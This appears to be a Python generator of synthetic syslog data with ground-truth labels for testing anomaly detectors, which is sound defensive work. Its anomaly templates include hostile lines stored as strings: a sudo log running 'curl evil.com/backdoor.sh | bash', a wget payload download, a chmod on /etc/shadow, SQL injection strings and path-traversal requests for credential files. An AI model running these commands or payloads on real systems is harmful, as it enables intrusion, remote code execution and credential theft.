#!/usr/bin/env python3
"""
Syslog Anomaly Ensemble Detector — syslog-generator skill.

Sinh dữ liệu syslog giả lập gồm 5000 dòng, chia thành log bình thường
(8 service) và log bất thường (9 loại), kèm ground truth để đánh giá mô hình.

Output:
    data/raw/syslog_synthetic.log      – file syslog tổng hợp
    data/raw/syslog_ground_truth.json  – nhãn từng dòng (is_anomaly, anomaly_type)
"""

import random
import json
import argparse
from datetime import datetime, timedelta
from pathlib import Path

# ---------------------------------------------------------------------------
# Cấu hình mặc định
# ---------------------------------------------------------------------------
DEFAULT_TOTAL_LINES = 5_000
DEFAULT_ANOMALY_RATIO = 0.10          # 10% dòng bất thường
DEFAULT_HOSTNAME = "server-01"
DEFAULT_START_DATE = "2026-06-12"
DEFAULT_OUTPUT_LOG = "data/raw/syslog_synthetic.log"
DEFAULT_OUTPUT_TRUTH = "data/raw/syslog_ground_truth.json"

# Dải PID mô phỏng cho từng service
SERVICE_PID_RANGE = {
    "sshd":     (1200, 1299),
    "sudo":     (1400, 1499),
    "cron":     (800, 899),
    "kernel":   (0, 0),        # kernel không có PID
    "firewall": (1500, 1599),
    "nginx":    (1600, 1699),
    "dns":      (1700, 1799),
    "systemd":  (1, 1),        # systemd luôn PID 1
}

# ---------------------------------------------------------------------------
# Mẫu log BÌNH THƯỜNG cho từng service
# ---------------------------------------------------------------------------
NORMAL_TEMPLATES = {
    "sshd": [
        "Accepted publickey for admin from 192.168.1.10 port 54231 ssh2",
        "Accepted password for user1 from 10.0.0.5 port 44182 ssh2",
        "Connection closed by authenticating user root 192.168.1.100 port 33210 [preauth]",
        "Received disconnect from 10.0.0.8 port 55123: 11: disconnected by user",
        "Server listening on 0.0.0.0 port 22",
        "Connection from 172.16.0.3 port 60234",
        "Accepted keyboard-interactive/pam for deploy from 10.0.0.12 port 48912 ssh2",
        "pam_unix(sshd:session): session opened for user admin by (uid=0)",
        "pam_unix(sshd:session): session closed for user admin",
        "Postponed publickey for user1 from 192.168.1.15 port 51234 ssh2 [preauth]",
    ],
    "sudo": [
        "admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/systemctl restart nginx",
        "deploy : TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/git pull",
        "user1 : TTY=pts/2 ; PWD=/home/user1 ; USER=root ; COMMAND=/usr/bin/apt update",
        "admin : TTY=pts/0 ; PWD=/etc/nginx ; USER=root ; COMMAND=/usr/bin/vim nginx.conf",
        "monitor : TTY=pts/3 ; PWD=/var/log ; USER=root ; COMMAND=/usr/bin/tail -f syslog",
        "deploy : TTY=pts/1 ; PWD=/opt/app ; USER=root ; COMMAND=/bin/systemctl status app",
        "backup : TTY=pts/4 ; PWD=/backup ; USER=root ; COMMAND=/usr/bin/rsync -av /data /backup",
        "admin : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/htop",
    ],
    "cron": [
        "CROND[4410]: (root) CMD (/usr/bin/run-parts /etc/cron.hourly)",
        "CROND[5120]: (www-data) CMD (/usr/bin/php /var/www/app/cron.php)",
        "CROND[3890]: (root) CMD (/usr/local/bin/backup.sh)",
        "CROND[6201]: (root) CMD (cd /var/log && /usr/sbin/logrotate /etc/logrotate.conf)",
        "/USR/SBIN/CRON[4500]: (root) CMD (/usr/lib/update-notifier/apt-check 2>&1)",
    ],
    "kernel": [
        "CPU0: Intel(R) Xeon(R) CPU E5-2680 v4 @ 2.40GHz (family: 0x6, model: 0x4f)",
        "eth0: link becomes ready",
        "NET: Registered protocol family 10",
        "EXT4-fs (sda1): mounted filesystem with ordered data mode",
        "random: crng init done",
        "systemd[1]: systemd 249.11-0ubuntu3 running in system mode",
        "Memory: 16384000K/16777216K available (14336K kernel code)",
        "ip_tables: (C) 2000-2006 Netfilter Core Team",
        "nf_conntrack version 0.5.0 (65536 buckets, 262144 max)",
    ],
    "firewall": [
        "IN=eth0 OUT= MAC=00:1a:2b:3c:4d:5e SRC=10.0.0.5 DST=10.0.0.1 LEN=52 TOS=0x00 PREC=0x00 TTL=64 PROTO=TCP SPT=443 DPT=54321 WINDOW=128 RES=0x00 ACK SYN URGP=0",
        "IN=eth0 OUT= SRC=192.168.1.10 DST=192.168.1.1 LEN=40 TOS=0x00 TTL=128 PROTO=TCP SPT=52341 DPT=80 WINDOW=65535 SYN URGP=0",
        "IN=eth0 OUT= MAC=ff:ff:ff:ff:ff:ff SRC=10.0.0.15 DST=10.0.0.255 LEN=328 TOS=0x00 TTL=64 PROTO=UDP SPT=68 DPT=67 LEN=308",
    ],
    "nginx": [
        'GET /index.html HTTP/1.1 200 612 "-" "Mozilla/5.0"',
        'POST /api/login HTTP/1.1 200 128 "-" "curl/7.81.0"',
        'GET /static/css/main.css HTTP/1.1 304 0 "-" "Mozilla/5.0"',
        'GET /api/users HTTP/1.1 200 2048 "-" "Python-urllib/3.10"',
        'GET /favicon.ico HTTP/1.1 404 153 "-" "Mozilla/5.0"',
        'GET /health HTTP/1.1 200 15 "-" "ELB-HealthChecker/2.0"',
        'POST /api/upload HTTP/1.1 201 89 "-" "okhttp/4.9.3"',
        'GET /about HTTP/1.1 200 1024 "-" "Googlebot/2.1"',
    ],
    "dns": [
        "client @0x7f8a3c001a10 10.0.0.5#54321 (api.example.com): query: api.example.com IN A + (10.0.0.1)",
        "client @0x7f8a3c002b20 192.168.1.10#12345 (www.google.com): query: www.google.com IN AAAA + (192.168.1.1)",
        "validating api.example.com/A: no valid signature found",
        "resolver priming query complete",
        "managed-keys-zone: loaded serial 123",
    ],
    "systemd": [
        "Started Session 145 of user admin",
        "Removed slice User Slice of user1",
        "Created slice User Slice of deploy",
        "Starting Cleanup of Temporary Directories...",
        "Finished Cleanup of Temporary Directories",
        "Starting Rotate log files...",
        "Finished Rotate log files",
        "Reached target Timers",
        "Starting Daily apt upgrade and clean activities...",
        "Listening on D-Bus System Message Bus Socket",
    ],
}

# ---------------------------------------------------------------------------
# Mẫu log BẤT THƯỜNG (9 loại)
# ---------------------------------------------------------------------------
ANOMALY_TEMPLATES = {
    "failed_password": [
        "Failed password for root from 203.0.113.42 port 55221 ssh2",
        "Failed password for admin from 198.51.100.7 port 60912 ssh2",
        "Failed password for user1 from 192.0.2.99 port 49876 ssh2",
        "Failed password for deploy from 203.0.113.101 port 50123 ssh2",
    ],
    "invalid_user": [
        "Invalid user guest from 203.0.113.50 port 40122",
        "Invalid user test from 198.51.100.88 port 33210",
        "Invalid user oracle from 192.0.2.200 port 55123",
        "Invalid user pi from 203.0.113.77 port 44182",
        "Invalid user ubuntu from 198.51.100.33 port 60901",
    ],
    "brute_force": [
        "Failed password for root from 10.0.0.99 port 40001 ssh2",
        "Failed password for root from 10.0.0.99 port 40002 ssh2",
        "Failed password for root from 10.0.0.99 port 40003 ssh2",
        "Failed password for root from 10.0.0.99 port 40004 ssh2",
        "Failed password for root from 10.0.0.99 port 40005 ssh2",
        "message repeated 15 times: [ Failed password for root from 10.0.0.99 port 40xxx ssh2 ]",
        "Connection closed by authenticating user root 10.0.0.99 port 40006 [preauth]",
    ],
    "reverse_lookup_failure": [
        "Unable to resolve hostname for 198.51.100.200: Name or service not known",
        "reverse mapping checking getaddrinfo for unknown-host.example.com [203.0.113.55] failed - POSSIBLE BREAK-IN ATTEMPT!",
        "Address 192.0.2.150 maps to suspicious.domain.xyz, but this does not map back to the address - POSSIBLE BREAK-IN ATTEMPT!",
    ],
    "suspicious_sudo": [
        "www-data : TTY=unknown ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/bash -c 'curl evil.com/backdoor.sh | bash'",
        "nobody : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget http://malware.net/payload -O /tmp/.hidden",
        "guest : user NOT in sudoers ; TTY=pts/5 ; PWD=/home/guest ; USER=root ; COMMAND=/bin/chmod 777 /etc/shadow",
    ],
    "port_scan": [
        "IN=eth0 OUT= SRC=203.0.113.99 DST=10.0.0.1 PROTO=TCP SPT=443 DPT=22 WINDOW=1024 SYN",
        "IN=eth0 OUT= SRC=203.0.113.99 DST=10.0.0.1 PROTO=TCP SPT=443 DPT=23 WINDOW=1024 SYN",
        "IN=eth0 OUT= SRC=203.0.113.99 DST=10.0.0.1 PROTO=TCP SPT=443 DPT=25 WINDOW=1024 SYN",
        "IN=eth0 OUT= SRC=203.0.113.99 DST=10.0.0.1 PROTO=TCP SPT=443 DPT=80 WINDOW=1024 SYN",
        "IN=eth0 OUT= SRC=203.0.113.99 DST=10.0.0.1 PROTO=TCP SPT=443 DPT=443 WINDOW=1024 SYN",
        "IN=eth0 OUT= SRC=203.0.113.99 DST=10.0.0.1 PROTO=TCP SPT=443 DPT=3306 WINDOW=1024 SYN",
        "IN=eth0 OUT= SRC=203.0.113.99 DST=10.0.0.1 PROTO=TCP SPT=443 DPT=5432 WINDOW=1024 SYN",
        "IN=eth0 OUT= SRC=203.0.113.99 DST=10.0.0.1 PROTO=TCP SPT=443 DPT=8080 WINDOW=1024 SYN",
        "IN=eth0 OUT= SRC=203.0.113.99 DST=10.0.0.1 PROTO=TCP SPT=443 DPT=6379 WINDOW=1024 SYN",
    ],
    "sql_injection": [
        "GET /api/users?id=1%27%20OR%20%271%27%3D%271 HTTP/1.1 500 89 \"-\" \"sqlmap/1.6\"",
        "GET /products.php?cat=1%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1 500 120 \"-\" \"Mozilla/5.0\"",
        "POST /login HTTP/1.1 500 45 \"-\" \"-\" --data \"user=admin'--&pass=x\"",
        "GET /search?q=%27%3B%20DROP%20TABLE%20users%3B-- HTTP/1.1 500 67 \"-\" \"curl/7.81.0\"",
    ],
    "directory_traversal": [
        "GET /../../etc/passwd HTTP/1.1 403 45 \"-\" \"curl/7.81.0\"",
        "GET /files/..%2f..%2f..%2fetc%2fshadow HTTP/1.1 403 45 \"-\" \"Mozilla/5.0\"",
        "GET /download?file=../../../var/log/auth.log HTTP/1.1 403 45 \"-\" \"wget/1.21\"",
        "GET /static/....//....//....//etc/hosts HTTP/1.1 403 45 \"-\" \"Python-urllib/3.10\"",
    ],
    "service_crash": [
        "systemd[1]: nginx.service: Main process exited, code=killed, status=11/SEGV",
        "systemd[1]: sshd.service: Failed with result 'signal'",
        "systemd[1]: cron.service: Main process exited, code=dumped, status=6/ABRT",
        "kernel: Oops: 0000 [#1] SMP NOPTI",
        "kernel: BUG: unable to handle kernel NULL pointer dereference at 0000000000000010",
        "kernel: NMI watchdog: BUG: soft lockup - CPU#2 stuck for 22s! [nginx:1620]",
    ],
}

# Độ ưu tiên hiển thị theo service (dùng để gán PID cho anomaly)
ANOMALY_SERVICE_MAP = {
    "failed_password":       "sshd",
    "invalid_user":          "sshd",
    "brute_force":           "sshd",
    "reverse_lookup_failure":"sshd",
    "suspicious_sudo":       "sudo",
    "port_scan":             "firewall",
    "sql_injection":         "nginx",
    "directory_traversal":   "nginx",
    "service_crash":         "systemd",
}

# Tỷ trọng tương đối giữa các service bình thường (càng cao càng nhiều dòng)
SERVICE_WEIGHTS = {
    "sshd":     6,
    "sudo":     4,
    "cron":     4,
    "kernel":   5,
    "firewall": 2,
    "nginx":    5,
    "dns":      2,
    "systemd":  4,
}


# ===================================================================
# Hàm tiện ích
# ===================================================================

def build_weighted_service_list() -> list[str]:
    """Trả về danh sách service lặp theo trọng số để random.choices dùng."""
    weighted = []
    for svc, weight in SERVICE_WEIGHTS.items():
        weighted.extend([svc] * weight)
    return weighted


def random_pid_for_service(service_name: str) -> str:
    """Sinh PID ngẫu nhiên trong dải quy ước của service. Kernel trả về rỗng."""
    low, high = SERVICE_PID_RANGE.get(service_name, (1000, 9999))
    if low == 0 and high == 0:
        return ""                 # kernel không có PID
    return str(random.randint(low, high))


def format_syslog_line(timestamp: datetime, hostname: str,
                       service_name: str, pid: str,
                       message: str) -> str:
    """Ghép thành 1 dòng syslog chuẩn RFC 3164.

    Định dạng: Mmm dd HH:MM:SS hostname service[pid]: message
    """
    timestr = timestamp.strftime("%b %d %H:%M:%S")
    if pid:
        header = f"{timestr} {hostname} {service_name}[{pid}]:"
    else:
        header = f"{timestr} {hostname} {service_name}:"
    return f"{header} {message}"


# ===================================================================
# Hàm chính sinh dữ liệu
# ===================================================================

def generate_synthetic_syslog(
    total_lines: int = DEFAULT_TOTAL_LINES,
    anomaly_ratio: float = DEFAULT_ANOMALY_RATIO,
    hostname: str = DEFAULT_HOSTNAME,
    start_date: str = DEFAULT_START_DATE,
    output_log: str = DEFAULT_OUTPUT_LOG,
    output_truth: str = DEFAULT_OUTPUT_TRUTH,
    seed: int = 42,
) -> tuple[list[str], list[dict]]:
    """Sinh dữ liệu syslog giả lập.

    Returns:
        log_lines: danh sách 5000 dòng syslog (đã sắp xếp theo thời gian)
        ground_truth: danh sách dict {line_number, is_anomaly, anomaly_type}
    """
    random.seed(seed)

    anomaly_count = round(total_lines * anomaly_ratio)
    normal_count = total_lines - anomaly_count

    start_dt = datetime.strptime(start_date, "%Y-%m-%d")
    weighted_services = build_weighted_service_list()

    # ------------------------------------------------------------------
    # 1. Sinh log bình thường
    # ------------------------------------------------------------------
    normal_entries: list[dict] = []
    time_cursor = start_dt

    for _ in range(normal_count):
        service = random.choice(weighted_services)
        message = random.choice(NORMAL_TEMPLATES[service])
        pid = random_pid_for_service(service)

        # Nhảy thời gian ngẫu nhiên 1–120 giây (phân phối mũ thô)
        gap_seconds = random.expovariate(1 / 30)          # trung bình ~30s
        gap_seconds = max(1, min(gap_seconds, 300))       # kẹp 1s–5ph
        time_cursor += timedelta(seconds=gap_seconds)

        normal_entries.append({
            "timestamp":  time_cursor,
            "hostname":   hostname,
            "service":    service,
            "pid":        pid,
            "message":    message,
            "is_anomaly": False,
            "anomaly_type": None,
        })

    # ------------------------------------------------------------------
    # 2. Sinh log bất thường (phân bố đều 9 loại)
    # ------------------------------------------------------------------
    anomaly_types = list(ANOMALY_TEMPLATES.keys())
    anomaly_entries: list[dict] = []

    for i in range(anomaly_count):
        a_type = anomaly_types[i % len(anomaly_types)]    # vòng tròn đều
        template_list = ANOMALY_TEMPLATES[a_type]
        message = random.choice(template_list)
        service = ANOMALY_SERVICE_MAP[a_type]
        pid = random_pid_for_service(service)

        gap_seconds = random.expovariate(1 / 30)
        gap_seconds = max(1, min(gap_seconds, 300))
        time_cursor += timedelta(seconds=gap_seconds)

        anomaly_entries.append({
            "timestamp":   time_cursor,
            "hostname":    hostname,
            "service":     service,
            "pid":         pid,
            "message":     message,
            "is_anomaly":  True,
            "anomaly_type": a_type,
        })

    # ------------------------------------------------------------------
    # 3. Gộp & sắp xếp theo timestamp
    # ------------------------------------------------------------------
    all_entries = normal_entries + anomaly_entries
    all_entries.sort(key=lambda e: e["timestamp"])

    # ------------------------------------------------------------------
    # 4. Định dạng dòng log & ground truth
    # ------------------------------------------------------------------
    log_lines: list[str] = []
    ground_truth: list[dict] = []

    for idx, entry in enumerate(all_entries, start=1):
        line = format_syslog_line(
            entry["timestamp"], entry["hostname"],
            entry["service"], entry["pid"], entry["message"],
        )
        log_lines.append(line)

        ground_truth.append({
            "line_number":  idx,
            "is_anomaly":   entry["is_anomaly"],
            "anomaly_type": entry["anomaly_type"],
        })

    # ------------------------------------------------------------------
    # 5. Ghi ra file
    # ------------------------------------------------------------------
    log_path = Path(output_log)
    truth_path = Path(output_truth)
    log_path.parent.mkdir(parents=True, exist_ok=True)
    truth_path.parent.mkdir(parents=True, exist_ok=True)

    with open(log_path, "w", encoding="utf-8") as lf:
        lf.write("\n".join(log_lines) + "\n")

    with open(truth_path, "w", encoding="utf-8") as tf:
        json.dump(ground_truth, tf, indent=2, ensure_ascii=False)

    # ------------------------------------------------------------------
    # 6. In thống kê
    # ------------------------------------------------------------------
    anomaly_types_found = sorted(set(
        g["anomaly_type"] for g in ground_truth if g["is_anomaly"]
    ))
    normal_cnt = sum(1 for g in ground_truth if not g['is_anomaly'])
    anomaly_cnt = sum(1 for g in ground_truth if g['is_anomaly'])
    print(f"[syslog-generator] Done!")
    print(f"  Total lines   : {len(log_lines)}")
    print(f"  Normal        : {normal_cnt}")
    print(f"  Anomalous     : {anomaly_cnt}")
    print(f"  Anomaly types : {', '.join(anomaly_types_found)}")
    print(f"  Log file      : {log_path.resolve()}")
    print(f"  Truth file    : {truth_path.resolve()}")

    return log_lines, ground_truth


# ===================================================================
# CLI entry point
# ===================================================================
if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Syslog generator – sinh syslog giả lập + ground truth"
    )
    parser.add_argument("--total-lines",   type=int,   default=DEFAULT_TOTAL_LINES)
    parser.add_argument("--anomaly-ratio", type=float, default=DEFAULT_ANOMALY_RATIO)
    parser.add_argument("--hostname",      type=str,   default=DEFAULT_HOSTNAME)
    parser.add_argument("--start-date",    type=str,   default=DEFAULT_START_DATE)
    parser.add_argument("--output-log",    type=str,   default=DEFAULT_OUTPUT_LOG)
    parser.add_argument("--output-truth",  type=str,   default=DEFAULT_OUTPUT_TRUTH)
    parser.add_argument("--seed",          type=int,   default=42)

    args = parser.parse_args()

    generate_synthetic_syslog(
        total_lines=args.total_lines,
        anomaly_ratio=args.anomaly_ratio,
        hostname=args.hostname,
        start_date=args.start_date,
        output_log=args.output_log,
        output_truth=args.output_truth,
        seed=args.seed,
    )
